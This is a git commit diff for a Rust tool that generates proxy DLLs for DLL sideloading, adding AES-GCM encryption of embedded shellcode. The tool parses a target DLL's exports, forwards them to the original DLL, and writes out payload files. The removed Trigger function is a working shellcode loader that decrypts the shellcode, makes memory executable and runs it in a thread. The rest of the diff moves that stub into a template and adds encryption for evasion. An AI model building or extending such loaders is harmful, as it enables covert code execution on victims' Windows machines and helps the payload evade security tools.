55d3fd61e29e76b53e871f9481f7ae3d2dc1c74d
floriani <benjamin.floriani@k-business.com>
2024-04-05 09:43:59 +0200

    added aes encryption

--- resources/template.rs
+++ resources/template.rs
@@ -2,7 +2,7 @@ use windows::Win32::{Foundation::{HANDLE, HMODULE}, System::{Memory::{VirtualAll
 use std::thread;
 use std::ptr;
 use aes_gcm::{
-    aead::{AeadMutInPlace, KeyInit}, Aes256Gcm, Key
+    aead::{Aead, KeyInit}, Aes256Gcm, Key
 };
 
 pub mod shellcode;
@@ -11,30 +11,7 @@ pub mod shellcode;
 {}
 
 
-#[no_mangle]
-pub extern "C" fn Trigger() {
-    
-    unsafe {
-        let address_pointer = VirtualAlloc(None, shellcode::SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-
-        let byte_key: [u8; 32] = Default::default();
-        let byte_nonce: [u8; 12] = Default::default();
-        let key = Key::<Aes256Gcm>::from_slice(&byte_key);
-        let mut cipher = Aes256Gcm::new(&key);
-        cipher.decrypt_in_place((&byte_nonce).into(), b"", &mut shellcode::SHELLCODE.to_vec());
-        
-        ptr::copy(shellcode::SHELLCODE.as_ptr(), address_pointer as *mut u8, shellcode::SIZE);
-        let old_protection = &mut PAGE_PROTECTION_FLAGS(0);
-        _ = VirtualProtect(address_pointer, shellcode::SIZE, PAGE_EXECUTE_READ, old_protection);
-        let function_pointer: fn() -> () = std::mem::transmute(address_pointer);
-        thread::spawn(move || {
-            function_pointer();
-        });
-        
-        WaitForSingleObject(HANDLE(-1), u32::MAX);
-    };
-
-}
+{SHELLCODE_STUB}
 
 #[no_mangle]
 #[allow(non_snake_case, unused_variables)]
--- src/main.rs
+++ src/main.rs
@@ -1,11 +1,12 @@
+use aes_gcm::{
+    aead::{AeadCore, AeadMutInPlace, KeyInit, OsRng},
+    Aes256Gcm,
+};
+use clap::Parser;
 use std::fs;
 use std::fs::File;
 use std::io::Write;
 use std::str;
-use clap::Parser;
-use aes_gcm::{
-    aead::{AeadCore, AeadMutInPlace, KeyInit, OsRng}, Aes256Gcm
-};
 
 pub mod pe_parser;
 
@@ -14,7 +15,6 @@ struct EncArgs {
     pub key: [u8; 32],
     pub nonce: [u8; 12],
 }
-
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -32,25 +32,22 @@ struct Args {
 }
 
 fn join_vec(nums: &[u8], sep: &str) -> String {
-    let str_nums: Vec<String> = nums.iter() 
-        .map(|n| n.to_string())  
-        .collect(); 
-    
+    let str_nums: Vec<String> = nums.iter().map(|n| n.to_string()).collect();
+
     str_nums.join(sep)
 }
 
-fn encrypt_aes(shellcode: &mut Vec<u8>) -> EncArgs{
+fn encrypt_aes(shellcode: &mut Vec<u8>) -> EncArgs {
     let key = Aes256Gcm::generate_key(OsRng);
     let mut cipher = Aes256Gcm::new(&key);
     let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
-    let a = nonce.len();
-    cipher.encrypt_in_place(&nonce, b"", shellcode).expect("Could not encrypt shellcode");
+    cipher
+        .encrypt_in_place(&nonce, b"", shellcode)
+        .expect("Could not encrypt shellcode");
     EncArgs {
         key: key.as_slice().try_into().expect("Key did not fit"),
         nonce: nonce.as_slice().try_into().expect("Nonce did not fit"),
     }
-    //cipher.encrypt(&nonce, shellcode);
-    //cipher.decrypt_in_place(&nonce, b"", shellcode);
 }
 
 fn main() -> std::io::Result<()> {
@@ -79,7 +76,6 @@ fn main() -> std::io::Result<()> {
     };
 
     let contents = fs::read(&args.dll).expect("Could not read dll file");
-    
 
     let file_name = args.dll.file_name().unwrap().to_str().unwrap();
 
@@ -91,11 +87,20 @@ fn main() -> std::io::Result<()> {
     }
 
     let export_table = pe_file.export_table;
-    println!("Found {} exported functions", export_table.array_of_names.len());
+    println!(
+        "Found {} exported functions",
+        export_table.array_of_names.len()
+    );
 
     let mut function_exports = "".to_owned();
     for i in 0..export_table.array_of_names.len() {
-        let function_export = format!("    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n", export_table.array_of_names[i], file_name, export_table.array_of_names[i], export_table.array_of_ordinals[i]);
+        let function_export = format!(
+            "    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n",
+            export_table.array_of_names[i],
+            file_name,
+            export_table.array_of_names[i],
+            export_table.array_of_ordinals[i]
+        );
         function_exports.push_str(&function_export);
     }
 
@@ -110,44 +115,60 @@ fn main() -> std::io::Result<()> {
     resource_path.pop();
 
     fs::create_dir(&output)?;
-    output.push("proxy.rs");
-    
-    let mut file = File::create(&output)?;
-    file.write_all(contents.replace("{}", export_asm.as_str()).as_bytes())?;
 
-    println!("Wrote proxy dll template to {:?}", output);
-    output.pop();
-
+    let mut content_shellcode_stub = Default::default();
     if shellcode.len() > 0 {
-
-        let enc_args = if args.encryption.is_some() {
+        let enc_algo = if args.encryption.is_some() {
             if args.encryption.unwrap() == "aes" {
-                encrypt_aes(&mut shellcode)
-     
+                resource_path.push("aes.rs");
+                let tmp_enc_algo = fs::read_to_string(&resource_path).expect("Could not read aes.rs");
+                resource_path.pop();
+                let enc_args = encrypt_aes(&mut shellcode);
+                tmp_enc_algo
+                    .replace("{KEY}", join_vec(&enc_args.key, ",").as_str())
+                    .replace("{NONCE}", join_vec(&enc_args.nonce, ",").as_str())
             } else {
                 panic!("Unkown encryption algorithm");
             }
-
         } else {
             println!("No encryption defined - embedding plain shellcode");
-            EncArgs::default()
+            String::from("let dec_shellcode = shellcode::SHELLCODE.to_vec();")
         };
 
-        
         resource_path.push("shellcode_template.rs");
-        let content_shellcode_template = fs::read_to_string(&resource_path).expect("Could not read shellcode_template.rs");
+        let content_shellcode_template =
+            fs::read_to_string(&resource_path).expect("Could not read shellcode_template.rs");
         resource_path.pop();
 
         let shellcode_str = join_vec(&shellcode, ",");
 
-        let content_shellcode = content_shellcode_template.replace("{SIZE}", shellcode.len().to_string().as_str()).replace("{SHELLCODE}", shellcode_str.as_str());
+        let content_shellcode = content_shellcode_template
+            .replace("{SIZE}", shellcode.len().to_string().as_str())
+            .replace("{SHELLCODE}", shellcode_str.as_str());
 
         output.push("shellcode.rs");
         let mut file = File::create(&output).expect("Could not create shellcode.rs");
         file.write_all(content_shellcode.as_bytes())?;
         println!("Wrote shellcode to {:?}", &output);
         output.pop();
+
+        resource_path.push("shellcode_stub.rs");
+        content_shellcode_stub =
+            fs::read_to_string(&resource_path).expect("Could not read shellcode_stub.rs");
+        resource_path.pop();
+        content_shellcode_stub = content_shellcode_stub.replace("{ENC}", &enc_algo)
     }
+
+    output.push("proxy.rs");
+    let mut file = File::create(&output)?;
+    file.write_all(
+        contents
+            .replace("{}", export_asm.as_str())
+            .replace("{SHELLCODE_STUB}", &content_shellcode_stub)
+            .as_bytes(),
+    )?;
+    println!("Wrote proxy dll template to {:?}", output);
+    output.pop();
 
     output.push("build.rs");
     resource_path.push("build.rs");
@@ -159,6 +180,4 @@ fn main() -> std::io::Result<()> {
     fs::copy(&resource_path, &output).expect("Could not create Cargo.toml");
 
     Ok(())
-
 }
-
